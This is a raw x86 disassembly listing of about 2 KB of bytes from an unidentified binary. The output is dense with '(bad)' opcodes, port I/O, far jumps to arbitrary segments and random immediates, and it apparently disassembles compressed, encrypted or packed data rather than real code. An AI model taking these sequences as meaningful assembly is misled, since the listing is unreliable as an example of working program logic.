  4183be:	sar    BYTE PTR [eiz*8+0x28d28b31],1
  4183c5:	mov    WORD PTR [ebx],es
  4183c7:	neg    DWORD PTR [edi-0x17]
  4183ca:	xchg   esp,eax
  4183cb:	mov    bh,0x64
  4183cd:	xchg   ebp,eax
  4183ce:	jge    0x4183c6
  4183d0:	push   es
  4183d1:	inc    esi
  4183d2:	aad    0x54
  4183d4:	xlat   BYTE PTR ds:[ebx]
  4183d5:	imul   edi,DWORD PTR [ecx+0x35cf6beb],0x38751a1b
  4183df:	xchg   ebp,eax
  4183e0:	es push ebp
  4183e2:	dec    ecx
  4183e3:	enter  0x75e9,0x19
  4183e7:	xchg   edi,eax
  4183e8:	and    DWORD PTR [ebp+0x23],ecx
  4183eb:	int    0x16
  4183ed:	pop    es
  4183ee:	pop    esp
  4183ef:	mov    ecx,DWORD PTR [ecx+0x3a]
  4183f2:	cwde   
  4183f3:	out    0x3,eax
  4183f5:	fild   DWORD PTR [ecx+0x1dee9325]
  4183fb:	(bad)  
  4183fc:	mov    ah,0x8e
  4183fe:	mov    ch,0xe9
  418400:	repnz stc 
  418402:	pop    ds
  418403:	xlat   BYTE PTR ds:[ebx]
  418404:	clc    
  418405:	and    al,0xee
  418407:	mov    ebx,0x102ef708
  41840c:	into   
  41840d:	shl    BYTE PTR [ecx-0x62],cl
  418410:	enter  0xfdcc,0xa1
  418414:	mov    ds:0xcee53107,al
  418419:	mov    bl,0x7
  41841b:	inc    edx
  41841c:	lea    ebp,[eax-0x61]
  41841f:	cli    
  418420:	push   ebp
  418421:	mov    ebx,0x98f8b0ee
  418426:	aad    0xbf
  418428:	out    dx,eax
  418429:	std    
  41842a:	jmp    0x3ef0:0x1acb0bc7
  418431:	push   0xf
  418433:	mov    ch,0xe3
  418435:	xor    esi,DWORD PTR [ebp-0x24]
  418438:	test   eax,0xa020ae98
  41843d:	push   0x7f
  41843f:	(bad)  
  418441:	inc    edx
  418442:	sub    DWORD PTR [edx-0x2b],ebp
  418445:	jp     0x41845a
  418447:	mov    DWORD PTR [eax+0x3e59202c],eax
  41844d:	shr    DWORD PTR [ebp-0x2e],1
  418450:	and    BYTE PTR [edi+0x7f0a4a10],bh
  418456:	xor    al,0x8b
  418458:	ins    DWORD PTR es:[edi],dx
  418459:	xor    DWORD PTR [ebx],ecx
  41845b:	sti    
  41845c:	add    DWORD PTR [ecx+0x37],ebp
  41845f:	fwait
  418460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418461:	aam    0x7a
  418463:	std    
  418464:	dec    esp
  418465:	(bad)  
  418466:	or     eax,edx
  418468:	dec    ebp
  418469:	sub    al,0x51
  41846b:	outs   dx,DWORD PTR ds:[esi]
  41846c:	fsubr  DWORD PTR [ebp-0x7e86ccba]
  418472:	and    BYTE PTR [ebp+0xb],bl
  418475:	mov    WORD PTR [edi-0x7decc79e],cs
  41847b:	or     DWORD PTR [ecx+0xaed0a09],eax
  418481:	inc    ebx
  418482:	lea    ecx,[esi-0x59]
  418485:	and    BYTE PTR [ebp+0x46096186],dh
  41848b:	psadbw mm6,QWORD PTR [ebx]
  41848e:	out    dx,al
  41848f:	shl    BYTE PTR [ecx],1
  418491:	cmp    ch,BYTE PTR [esi]
  418493:	jmp    0xf773d470
  418498:	ja     0x4184d2
  41849a:	mov    ds:0x9c1287fb,eax
  41849f:	or     ch,ah
  4184a1:	sbb    BYTE PTR [esi+0x28a9e09d],dl
  4184a7:	mov    esp,0xca18f7db
  4184ac:	add    eax,0x3b430481
  4184b1:	dec    ecx
  4184b2:	mov    ebp,ebp
  4184b4:	dec    ecx
  4184b5:	jp     0x4184ba
  4184b7:	pushf  
  4184b8:	and    ecx,DWORD PTR [edx-0x39]
  4184bb:	jbe    0x418453
  4184bd:	scas   al,BYTE PTR es:[edi]
  4184be:	dec    esp
  4184bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184c0:	stc    
  4184c1:	ja     0x41850f
  4184c3:	clc    
  4184c4:	add    al,0xf0
  4184c6:	addr16 int3 
  4184c8:	or     BYTE PTR [esi],dl
  4184ca:	repz ss jnp 0x4184dd
  4184ce:	and    DWORD PTR [edi],0xffffffe8
  4184d1:	lods   al,BYTE PTR ds:[esi]
  4184d2:	lock and al,0xb6
  4184d5:	cmp    eax,0xacc56136
  4184da:	gs in  al,dx
  4184dc:	ja     0x418506
  4184de:	push   esp
  4184df:	aad    0x67
  4184e1:	daa    
  4184e2:	push   ss
  4184e3:	or     BYTE PTR cs:[ebx],al
  4184e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184e7:	rol    DWORD PTR [ebp+0x7b],cl
  4184ea:	repnz mov ds:0x2ff026e5,eax
  4184f0:	add    eax,0x3d6703a
  4184f5:	push   esi
  4184f6:	shl    BYTE PTR [esi+0x52],cl
  4184f9:	jne    0x418490
  4184fb:	loop   0x41855a
  4184fd:	or     eax,0x9c9a25ac
  418502:	addr16 in al,0xf8
  418505:	mov    ebp,0xecfbe52
  41850a:	imul   eax,esp,0x6
  41850d:	cwde   
  41850e:	(bad)  
  418510:	xchg   BYTE PTR [ecx],cl
  418512:	cmp    ch,BYTE PTR ds:[ebp+0x5bef3dd7]
  418519:	or     DWORD PTR [ecx+0x56],0xac3d25cf
  418520:	mov    esp,cs
  418522:	dec    esp
  418523:	(bad)  
  418524:	sbb    edi,ebx
  418526:	jno    0x41851c
  418528:	jmp    0x611:0xc7d52d15
  41852f:	fwait
  418530:	jb     0x418554
  418532:	add    bl,BYTE PTR [esi+ebx*8]
  418535:	nop
  418536:	aad    0x6d
  418538:	test   al,0xc
  41853a:	ja     0x418515
  41853c:	cmc    
  41853d:	add    DWORD PTR [edi+0x474d7845],ebp
  418543:	ds mov ecx,0x73f78f70
  418549:	(bad)  
  41854a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41854b:	jns    0x4185a0
  41854d:	stc    
  41854e:	fmulp  st(1),st
  418550:	adc    dh,dl
  418552:	je     0x4184e1
  418554:	loop   0x4184ff
  418556:	and    al,0xef
  418558:	xchg   DWORD PTR [esi-0x52c4e3b2],eax
  41855e:	nop
  41855f:	jmp    0xacecde4
  418564:	jo     0x4185a0
  418566:	test   BYTE PTR [ebp-0x18d82172],al
  41856c:	(bad)  
  41856d:	clc    
  41856e:	ret    
  41856f:	int    0x58
  418571:	xor    DWORD PTR ds:0x7b330dd5,esp
  418577:	jmp    0x41857f
  418579:	mov    bh,cl
  41857b:	or     al,0x12
  41857d:	das    
  41857e:	or     eax,DWORD PTR [ebx-0x7b45f764]
  418584:	jecxz  0x4185cc
  418586:	cmp    BYTE PTR [edi+eiz*8-0x5d5d463e],dl
  41858d:	call   0x3a1f:0xa7fb4c0e
  418594:	pop    ecx
  418595:	sub    ch,BYTE PTR [ecx-0x51]
  418598:	mov    ch,0xa7
  41859a:	pop    es
  41859b:	inc    esp
  41859c:	xchg   esp,eax
  41859d:	in     eax,0xf8
  41859f:	(bad)  
  4185a0:	pop    ecx
  4185a1:	mov    esi,0x644a39bb
  4185a6:	add    DWORD PTR [ebx],edx
  4185a8:	lahf   
  4185a9:	stos   BYTE PTR es:[edi],al
  4185aa:	or     BYTE PTR [esi],bl
  4185ac:	jmp    0xc6ab:0xc2d1ea49
  4185b3:	fsub   QWORD PTR [ebp-0x697aa85c]
  4185b9:	fidivr DWORD PTR ds:0x668418b7
  4185bf:	inc    eax
  4185c0:	shl    DWORD PTR [ecx],0xad
  4185c3:	leave  
  4185c4:	lahf   
  4185c5:	mov    ch,0xcc
  4185c7:	inc    ebp
  4185c8:	ret    0x8172
  4185cb:	jns    0x418563
  4185cd:	pop    ds
  4185ce:	pop    eax
  4185cf:	mov    ebx,0x88f9ec3e
  4185d4:	lds    ecx,FWORD PTR [edi+0x65]
  4185d7:	retf   
  4185d8:	sub    al,0x9c
  4185da:	add    BYTE PTR [eax+0x560ea674],0x22
  4185e1:	cld    
  4185e2:	add    eax,DWORD PTR [ebp+edi*2-0x30]
  4185e6:	stos   DWORD PTR es:[edi],eax
  4185e7:	icebp  
  4185e8:	ret    
  4185e9:	and    eax,0xfe8d3f27
  4185ee:	mov    ebp,0x824d7bfd
  4185f3:	pop    ebp
  4185f4:	fistp  QWORD PTR [ebx]
  4185f6:	stc    
  4185f7:	dec    ebx
  4185f8:	clc    
  4185f9:	scas   eax,DWORD PTR es:[edi]
  4185fa:	stos   DWORD PTR es:[edi],eax
  4185fb:	mov    ch,0xfd
  4185fd:	mov    ds:0xea43a00d,eax
  418602:	cdq    
  418603:	jmp    0x4185db
  418605:	xchg   edi,eax
  418606:	ins    DWORD PTR es:[edi],dx
  418607:	and    ebp,DWORD PTR [ebx]
  418609:	fst    DWORD PTR [ebx+0xb]
  41860c:	xor    ebx,DWORD PTR [edx+ecx*2-0x62]
  418610:	pop    edx
  418611:	mov    al,0x71
  418613:	imul   esp,DWORD PTR [eax+0x20],0xd024585b
  41861a:	fdiv   QWORD PTR [ebp-0x650278e0]
  418620:	inc    esi
  418621:	and    BYTE PTR [esi+eiz*1-0x61],dl
  418625:	popaw  
  418627:	pop    edx
  418628:	(bad)  
  418629:	ja     0x4186a4
  41862b:	jae    0x418636
  41862d:	loopne 0x418649
  41862f:	mov    ds:0x380e82d8,al
  418634:	lahf   
  418635:	pop    es
  418636:	mov    eax,ds:0x47a0fa1f
  41863b:	(bad)  
  41863c:	and    bh,BYTE PTR [eax+edx*1-0x6a]
  418640:	add    al,BYTE PTR [ebx+eiz*1]
  418643:	push   cs
  418644:	jbe    0x418624
  418646:	fcomp  QWORD PTR ds:0xe7c592b4
  41864c:	ret    0xcaf2
  41864f:	in     eax,0xc7
  418651:	push   cs
  418652:	test   al,0xb
  418654:	add    DWORD PTR [edi-0x5c],esp
  418657:	(bad)  
  418658:	sahf   
  418659:	(bad)  
  41865a:	xor    BYTE PTR [edx+0x7d],bh
  41865d:	(bad)  [ebp+ebx*8-0x29aa3bd6]
  418664:	add    al,0x8d
  418666:	xor    edi,DWORD PTR [ecx+0x259d7702]
  41866c:	jge    0x4186c0
  41866e:	ja     0x418628
  418670:	jge    0x418676
  418672:	jb     0x41863e
  418674:	dec    esi
  418675:	scas   eax,DWORD PTR es:[edi]
  418676:	pop    esp
  418677:	call   DWORD PTR [eax]
  418679:	or     DWORD PTR [edx+esi*2],eax
  41867c:	dec    ebx
  41867d:	mov    al,0x9e
  41867f:	adc    DWORD PTR [eax+edi*1-0x4a],esi
  418683:	push   esp
  418684:	in     al,0xa4
  418686:	inc    eax
  418687:	es scas eax,DWORD PTR es:[edi]
  418689:	rcr    BYTE PTR [esi+0x5a68e428],0x22
  418690:	jne    0x418709
  418692:	mov    ebx,0x85860220
  418697:	popa   
  418698:	pop    ebx
  418699:	loopne 0x418700
  41869b:	mov    ds:0x95a06330,al
  4186a0:	out    dx,al
  4186a1:	push   ecx
  4186a2:	mov    dl,BYTE PTR [esi-0x44afe88a]
  4186a8:	pop    ebx
  4186a9:	push   edi
  4186aa:	mov    esp,0xba2dc18
  4186af:	sbb    BYTE PTR [edi-0x3067ee2b],cl
  4186b5:	pop    ds
  4186b6:	lods   al,BYTE PTR ds:[esi]
  4186b7:	popa   
  4186b8:	rcr    DWORD PTR [ecx],1
  4186ba:	dec    esp
  4186bb:	inc    ebx
  4186bc:	push   ebx
  4186bd:	mov    cx,WORD PTR [edi-0x61]
  4186c1:	mov    eax,0x663cf40a
  4186c6:	leave  
  4186c7:	cmp    BYTE PTR ds:0xf4c90484,bl
  4186cd:	xchg   esi,eax
  4186ce:	mov    cl,BYTE PTR [esp+eiz*4]
  4186d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186d2:	jl     0x4186e3
  4186d4:	aaa    
  4186d5:	repz ja 0x418694
  4186d8:	push   ds
  4186d9:	sub    DWORD PTR [edi-0x22],ecx
  4186dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186dd:	ret    0x49d6
  4186e0:	loopne 0x4186ea
  4186e2:	ins    DWORD PTR es:[edi],dx
  4186e3:	or     al,0x14
  4186e5:	push   edx
  4186e6:	stos   BYTE PTR es:[edi],al
  4186e7:	loop   0x4186e8
  4186e9:	push   esi
  4186ea:	test   BYTE PTR [esi],ch
  4186ec:	cmp    edi,edx
  4186ee:	inc    esp
  4186ef:	cmc    
  4186f0:	rcr    DWORD PTR [ecx],1
  4186f2:	jb     0x4186a9
  4186f4:	outs   dx,DWORD PTR ds:[esi]
  4186f5:	push   edx
  4186f6:	ret    0x96a2
  4186f9:	mov    ebp,0x8159ff9c
  4186fe:	push   0x4c
  418700:	xor    BYTE PTR [edi-0xd],bl
  418703:	in     eax,dx
  418704:	pusha  
  418705:	inc    ebp
  418706:	imul   ebx,ecx,0x2523a5a2
  41870c:	rol    dl,cl
  41870e:	addr16 push ebp
  418710:	sub    ebx,DWORD PTR [eax+ebp*8+0x61]
  418714:	push   eax
  418715:	mov    ds:0x34105db3,eax
  41871a:	bswap  ebp
  41871c:	adc    al,0x8
  41871e:	jae    0x4186df
  418720:	xchg   esi,eax
  418721:	and    eax,0x81ac5b68
  418726:	push   ebp
  418727:	into   
  418728:	mov    eax,?
  41872a:	(bad)  
  41872b:	fst    QWORD PTR [esi+0x75]
  41872e:	mov    ch,0xeb
  418730:	and    eax,0xb45f63a2
  418735:	scas   al,BYTE PTR es:[edi]
  418736:	iret   
  418737:	repz test eax,0x36715a61
  41873d:	fcom   QWORD PTR [ecx]
  41873f:	push   cs
  418740:	jge    0x418798
  418742:	in     eax,dx
  418743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418744:	enter  0xa943,0xe7
  418748:	dec    edx
  418749:	mov    ecx,0x6d121a27
  41874e:	sbb    eax,0x44a03596
  418753:	push   esi
  418754:	mov    ss,WORD PTR [ebx-0x67ff0d76]
  41875a:	jmp    FWORD PTR [eax]
  41875c:	pop    eax
  41875d:	sbb    BYTE PTR [ecx+0xfdb711f],ch
  418763:	pop    edx
  418764:	pushf  
  418765:	inc    ecx
  418766:	push   ds
  418767:	xor    esp,DWORD PTR ds:0x26ee74dd
  41876d:	cmp    al,0x5f
  41876f:	rcl    BYTE PTR [esi+0x76],1
  418772:	pop    ebx
  418773:	out    0xdb,al
  418775:	mov    ebp,DWORD PTR [edi+0x2b4ddf82]
  41877b:	sbb    ebx,DWORD PTR [esi]
  41877d:	push   edx
  41877e:	pushf  
  41877f:	outs   dx,BYTE PTR ds:[esi]
  418780:	pusha  
  418781:	dec    edi
  418782:	lahf   
  418783:	adc    edx,0x852b2ad7
  418789:	cld    
  41878a:	pushw  0xaea7
  41878e:	sbb    ebx,DWORD PTR [ebp+0x28000410]
  418794:	rol    ecx,cl
  418796:	cs sbb al,0x89
  418799:	test   DWORD PTR [edx+0x65],0xdd6a045
  4187a0:	leave  
  4187a1:	dec    ecx
  4187a2:	jle    0x418735
  4187a4:	sti    
  4187a5:	sbb    bl,ah
  4187a7:	jg     0x4187c0
  4187a9:	inc    ebx
  4187aa:	inc    ecx
  4187ab:	inc    eax
  4187ac:	inc    eax
  4187ad:	ret    
  4187ae:	in     al,dx
  4187af:	and    BYTE PTR [edi-0x6a],bl
  4187b2:	rol    BYTE PTR [ecx],0xaf
  4187b5:	push   0x37145447
  4187ba:	sbb    eax,0x917f945c
  4187bf:	pop    esi
  4187c0:	add    DWORD PTR [edx],edi
  4187c2:	shl    BYTE PTR [eax],0x27
  4187c5:	fnsave [edx-0x2b]
  4187c8:	test   BYTE PTR [eax+0x4e73a178],dh
  4187ce:	(bad)  
  4187cf:	in     al,0x9
  4187d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187d2:	loope  0x4187b2
  4187d4:	call   0x84a98d69
  4187d9:	shl    BYTE PTR [edi-0x5df275b5],1
  4187df:	lods   eax,DWORD PTR ds:[esi]
  4187e0:	xlat   BYTE PTR ds:[ebx]
  4187e1:	dec    esp
  4187e2:	sbb    eax,0x5162f68e
  4187e7:	nop
  4187e8:	or     eax,0xb84ea61a
  4187ed:	outs   dx,DWORD PTR ds:[esi]
  4187ee:	adc    DWORD PTR ds:0x894a4598,esp
  4187f4:	rol    esi,0xf7
  4187f7:	jg     0x41883a
  4187f9:	mov    ebx,DWORD PTR [ecx]
  4187fb:	cwde   
  4187fc:	rol    BYTE PTR [ebp+0x1feb2f9f],1
  418802:	shr    BYTE PTR [esi+0x30],0x40
  418806:	mov    ds:0xaa188f8d,al
  41880b:	rcl    DWORD PTR [ebp+0x59],0xf5
  41880f:	stos   BYTE PTR es:[edi],al
  418810:	add    ah,BYTE PTR [edi-0x662bfaa2]
  418816:	sbb    bl,cl
  418818:	and    dl,dh
  41881a:	xor    DWORD PTR [ebx+0x34],edx
  41881d:	pop    ebx
  41881e:	mov    dl,0x2a
  418820:	cmp    edi,eax
  418822:	cmp    DWORD PTR [ecx-0x43],ebp
  418825:	(bad)  
  418826:	xchg   DWORD PTR [edx+0x19],ebx
  418829:	jmp    0xfeb1:0x3bcc9814
  418830:	lods   eax,DWORD PTR ds:[esi]
  418831:	ja     0x4187fe
  418833:	std    
  418834:	or     bl,ah
  418836:	cmp    BYTE PTR [edi-0x6b6ba427],ch
  41883c:	out    0x2f,al
  41883e:	imul   edx,DWORD PTR [eax-0x11dc9456],0x2616a31b
  418848:	mov    eax,0x7b71768
  41884d:	and    eax,0xffffe914
  418852:	retf   0x1d3
  418855:	bound  ebx,QWORD PTR [ebp+edx*4-0x4e]
  418859:	xchg   BYTE PTR [eax-0x574da02f],bl
  41885f:	sahf   
  418860:	in     eax,dx
  418861:	mov    dh,0x58
  418863:	arpl   bx,sp
  418865:	inc    ecx
  418866:	(bad)  
  418867:	adc    al,BYTE PTR [edi+0x46]
  41886a:	and    DWORD PTR [ecx+0x3c],0xffffff97
  41886e:	call   0xb6d:0xd723e1e1
  418875:	or     BYTE PTR [eax],dh
  418877:	xor    eax,0x879698d2
  41887c:	and    al,0xa0
  41887e:	and    eax,DWORD PTR [ecx+0x49473d5]
  418884:	jb     0x41889e
  418886:	inc    esi
  418887:	mov    es,WORD PTR [esi+esi*8-0x54]
  41888b:	lods   eax,DWORD PTR ds:[esi]
  41888c:	push   0x43
  41888e:	cld    
  41888f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418890:	in     eax,dx
  418891:	sub    eax,DWORD PTR [edi-0x40]
  418894:	push   edx
  418895:	add    ebp,ebp
  418897:	or     al,BYTE PTR [esi-0x37902147]
  41889d:	or     eax,0xd2bd8560
  4188a2:	je     0x418906
  4188a4:	add    DWORD PTR [ebx+0x4e29d466],0x4278089f
  4188ae:	cmp    al,0xca
  4188b0:	xchg   ebp,eax
  4188b1:	ror    BYTE PTR [eax+0x7badbc4c],1
  4188b7:	jno    0x41884a
  4188b9:	jl     0x418901
  4188bb:	and    DWORD PTR [edi],ebx
  4188bd:	xchg   BYTE PTR [ebx-0x23],bl
  4188c0:	pop    ecx
  4188c1:	data16 loope 0x41892b
  4188c4:	mov    ebp,0xf03b9d6e
  4188c9:	pop    ecx
  4188ca:	test   eax,0xb12039cb
  4188cf:	aas    
  4188d0:	call   0xabde:0xeba657ff
  4188d7:	xchg   BYTE PTR [ebx+0x2d15ca27],dl
  4188dd:	mov    al,BYTE PTR [eax-0x72223cc2]
  4188e3:	jno    0x41893e
  4188e5:	jns    0x41888e
  4188e7:	xchg   ecx,eax
  4188e8:	lahf   
  4188e9:	sub    BYTE PTR [edx],ah
  4188eb:	sub    al,0xe1
  4188ed:	imul   esp,DWORD PTR [eax-0x3f5c9411],0x73
  4188f4:	(bad)  
  4188f5:	jbe    0x41889d
  4188f7:	jmp    0x4188e7
  4188f9:	cmp    dh,BYTE PTR [eax-0x2d]
  4188fc:	dec    ecx
  4188fd:	adc    BYTE PTR [edi-0x40],bh
  418900:	mov    ebp,0x5b34f10f
  418905:	jns    0x5219ea62
  41890b:	ret    
  41890c:	or     edx,DWORD PTR [edx+0x14]
  41890f:	push   0xffffffd8
  418911:	lods   al,BYTE PTR ds:[esi]
  418912:	adc    esp,0x28
  418915:	shr    BYTE PTR [edi],0x69
  418918:	mov    ?,WORD PTR [edi+eax*8+0x73]
  41891c:	jnp    0x41896a
  41891e:	xor    eax,0xaf28d3ad
  418923:	sbb    ebx,0x91c3e1dd
  418929:	jl     0x418911
  41892b:	or     al,0x73
  41892d:	mov    dl,0xf7
  41892f:	ret    
  418930:	imul   eax,DWORD PTR [esi+0x11],0x2a
  418934:	jb     0x418945
  418936:	push   cs
  418937:	fs push cs
  418939:	mov    ss,WORD PTR [ecx]
  41893b:	out    dx,al
  41893c:	es jbe 0x4188ca
  41893f:	or     eax,0xd169b60a
  418944:	sub    DWORD PTR [edi],ebx
  418946:	in     eax,0x2e
  418948:	out    dx,al
  418949:	add    al,0x10
  41894b:	xchg   edx,eax
  41894c:	mov    dl,0xc1
  41894e:	push   ds
  41894f:	pop    ss
  418950:	ret    
  418951:	sti    
  418952:	imul   esi,DWORD PTR [eax+edi*2],0xffffffb0
  418956:	ret    0x51e
  418959:	push   0xffffff89
  41895b:	neg    DWORD PTR [esi-0x3e4516c6]
  418961:	test   eax,0x97269892
  418966:	cmp    al,0xcf
  418968:	cmp    DWORD PTR [edi-0x7382a2f],0x1a
  41896f:	cdq    
  418970:	dec    ebp
  418971:	or     cl,ah
  418973:	adc    BYTE PTR [esi+0x25],bh
  418976:	js     0x4189b5
  418978:	(bad)  
  418979:	std    
  41897a:	sbb    cl,BYTE PTR [edi+ecx*4-0x1072a47]
  418981:	mov    dl,BYTE PTR [ebp+0x33]
  418984:	pop    eax
  418985:	pop    ecx
  418986:	mov    dl,0x20
  418988:	in     eax,dx
  418989:	pop    esp
  41898a:	xchg   edx,eax
  41898b:	ins    DWORD PTR es:[edi],dx
  41898c:	nop
  41898d:	cld    
  41898e:	mov    bl,0x91
  418990:	and    esp,DWORD PTR [edx+0x65]
  418993:	sahf   
  418994:	ret    0x766d
  418997:	int    0x53
  418999:	out    0xee,eax
  41899b:	add    bl,BYTE PTR [edi]
  41899d:	jecxz  0x4189ff
  41899f:	test   BYTE PTR [ecx-0x10],ch
  4189a2:	mov    esp,0xfaad7c9f
  4189a7:	dec    DWORD PTR [esi+0x28906967]
  4189ad:	call   0x5d81:0x79ad9a00
  4189b4:	out    0x8c,eax
  4189b6:	or     ch,BYTE PTR [edx]
  4189b8:	test   DWORD PTR [esi+0x221849a3],0x39c919de
  4189c2:	mov    edi,0xea9381da
  4189c7:	pop    esp
  4189c8:	fstp   QWORD PTR [ecx+0x344ddbef]
  4189ce:	mov    bp,0x6687
  4189d2:	inc    DWORD PTR [esi+0x2b2cd96d]
  4189d8:	in     eax,dx
  4189d9:	pushf  
  4189da:	into   
  4189db:	sbb    BYTE PTR [ecx-0x2dce08ec],bl
  4189e1:	sub    eax,0x5f5874bc
  4189e6:	aad    0x52
  4189e8:	adc    ch,bl
  4189ea:	cld    
  4189eb:	clc    
  4189ec:	mov    ds:0x264f21b1,ax
  4189f2:	mov    ebx,0xb30c724
  4189f7:	lock mov ebx,0x5686b1cf
  4189fd:	clc    
  4189fe:	call   0x515:0x7c3d03d2
  418a05:	jle    0x418992
  418a07:	mov    ebp,0x390cd7b1
  418a0c:	popa   
  418a0d:	dec    esp
  418a0e:	push   ecx
  418a0f:	mov    bh,0xfa
  418a11:	pop    ebx
  418a12:	loopne 0x418a11
  418a14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a15:	pusha  
  418a16:	dec    ebx
  418a17:	inc    eax
  418a18:	mov    edx,0xff56887c
  418a1d:	cmp    eax,0xdb78d7dd
  418a22:	icebp  
  418a23:	stos   BYTE PTR es:[edi],al
  418a24:	jg     0x4189d2
  418a26:	xchg   esi,eax
  418a27:	jge    0x418a11
  418a29:	cdq    
  418a2a:	cmp    eax,0xd1566644
  418a2f:	adc    eax,0xcb52726a
  418a34:	out    dx,al
  418a35:	xchg   BYTE PTR ds:0x8a70f903,bl
  418a3b:	mov    cl,0xc4
  418a3d:	loope  0x418a03
  418a3f:	mov    ss,esi
  418a41:	sbb    al,0x8
  418a43:	mov    BYTE PTR [ecx],cl
  418a45:	cld    
  418a46:	call   0xe428:0x4f6cc4a0
  418a4d:	xchg   ebp,eax
  418a4e:	pop    es
  418a4f:	loopne 0x418a8f
  418a51:	or     al,0xc6
  418a53:	mov    ebp,0x8ea81644
  418a58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a59:	and    DWORD PTR [ecx+0x5a],0x4
  418a5d:	in     al,dx
  418a5e:	mov    ah,0x79
  418a60:	xor    edx,DWORD PTR [eax]
  418a62:	pushf  
  418a63:	push   ebx
  418a64:	jmp    0x8ff6:0xa27924ef
  418a6b:	es jg  0x418a7a
  418a6e:	xchg   edx,eax
  418a6f:	mov    al,0xf
  418a71:	inc    di
  418a73:	cs popf 
  418a75:	leave  
  418a76:	jecxz  0x418a25
  418a78:	xor    al,0x20
  418a7a:	out    dx,al
  418a7b:	add    al,BYTE PTR [esi+esi*2+0x15]
  418a7f:	pop    esp
  418a80:	mov    cl,0xec
  418a82:	mov    ebp,0x428f5157
  418a87:	push   eax
  418a88:	dec    edx
  418a89:	jo     0x418ac9
  418a8b:	(bad)  
  418a8c:	jmp    0xb9ac:0xf7c0b32a
  418a93:	je     0x418af8
  418a95:	cmp    ebx,DWORD PTR [edi+ecx*2]
  418a98:	dec    esi
  418a99:	fisttp DWORD PTR [eax-0x7]
  418a9c:	sbb    DWORD PTR [eax+ebp*8-0x3e63cbcc],edx
  418aa3:	cmc    
  418aa4:	imul   ebx,DWORD PTR [ebx+esi*2],0x822b55fe
  418aab:	call   0x87f5fbc4
  418ab0:	adc    BYTE PTR [edx-0x39328ea9],bl
  418ab6:	(bad)  
  418ab8:	arpl   WORD PTR [esi+0x4fdc8bf2],dx
  418abe:	fstp   QWORD PTR [esi]
  418ac0:	jb     0x418a7c
  418ac2:	mov    eax,0x1f5d2e61
  418ac8:	ror    esi,cl
  418aca:	jmp    0x418b30
  418acc:	pop    ecx
  418acd:	inc    esi
  418ace:	push   edx
  418acf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ad1:	adc    BYTE PTR [ecx],bl
  418ad3:	ror    DWORD PTR [eax+0x9],cl
  418ad6:	lds    edx,FWORD PTR [esp+edx*8+0x6c513342]
  418add:	add    ecx,ecx
  418adf:	push   esi
  418ae0:	test   DWORD PTR [edi],0xedb73b86
  418ae6:	ds mov edx,0x2d1bd494
  418aec:	sbb    cl,BYTE PTR es:[ebp+ebp*1+0xe05bdf0]
  418af4:	les    ebp,FWORD PTR [esi+0x3dccf668]
  418afa:	pop    ecx
  418afb:	popf   
  418afc:	in     al,dx
  418afd:	sbb    edx,DWORD PTR [edx-0x4]
  418b00:	mov    WORD PTR [ebx],fs
  418b02:	dec    esp
  418b03:	gs jbe 0x418ae3
  418b06:	faddp  st(6),st
  418b08:	fwait
  418b09:	xor    DWORD PTR [edi-0x28a69495],ebp
  418b0f:	int    0x6a
  418b11:	mov    DWORD PTR [edi],edx
  418b13:	xchg   BYTE PTR [esi-0x33d40a5d],cl
  418b19:	mov    ebp,0x7ecff31b
  418b1e:	inc    ebp
  418b1f:	mov    bh,0xd4
  418b21:	mov    BYTE PTR ds:0xabe36d6f,cl
  418b27:	sub    BYTE PTR [edx],dl
  418b29:	xchg   BYTE PTR [edx-0x5dba3505],bl
  418b2f:	pop    edx
  418b30:	adc    al,BYTE PTR [eax+eiz*1]
  418b33:	mov    bh,0x6f
  418b35:	cmp    eax,0xb28767ab
  418b3a:	(bad)  
  418b3b:	stos   DWORD PTR es:[edi],eax
  418b3c:	cmp    BYTE PTR [edi+0x78],dl
  418b3f:	pop    edi
  418b40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b41:	inc    edx
  418b42:	scas   al,BYTE PTR es:[edi]
  418b43:	rcl    BYTE PTR [ecx-0x3e],0x15
  418b47:	cmc    
  418b48:	(bad)  
  418b49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b4a:	mov    ecx,0x76e6aaee
  418b4f:	cmp    al,0xdc
  418b51:	and    al,0x16
  418b53:	std    
  418b54:	imul   esp,DWORD PTR [esi+0x5f],0xffffffa3
  418b58:	ret    0xb88
  418b5b:	outs   dx,BYTE PTR ds:[esi]
  418b5c:	mov    es:0x40aaac7c,eax
  418b62:	and    al,0xfe
  418b64:	inc    edi
  418b65:	add    DWORD PTR [esp+ebx*2+0x28],ecx
  418b69:	es dec ebp
  418b6b:	jne    0x418b25
  418b6d:	pop    edi
  418b6e:	adc    bh,BYTE PTR [edi+0x2b4d4f2d]
  418b74:	cdq    
  418b75:	push   ss
  418b76:	jmp    0x6f16:0x19f4bbfc
  418b7d:	mov    al,ds:0x70db11fe
  418b82:	addr16 je 0x418bfc
  418b85:	and    BYTE PTR [edi+0x4fb3e628],dh
  418b8b:	jecxz  0x418b2b
  418b8d:	rcr    ah,0xa3
  418b90:	jnp    0x418b92
  418b92:	and    bl,BYTE PTR [esi-0x3269312f]
  418b98:	add    DWORD PTR [ebp-0x18861280],esi
  418b9e:	pusha  
  418b9f:	call   0x2d967c8f
  418ba4:	add    DWORD PTR [ecx-0x3a],edi
  418ba7:	sbb    DWORD PTR [ebx+ebx*2],ecx
  418baa:	adc    esi,esi
  418bac:	pop    ecx
  418bad:	add    BYTE PTR [edi-0x6da9f0b6],ah
  418bb3:	pop    esi
  418bb4:	add    ecx,DWORD PTR [eax-0x2b5c4ba4]
  418bba:	and    eax,ebx
  418bbc:	jge    0x418c10
  418bbe:	icebp  
  418bbf:	pusha  
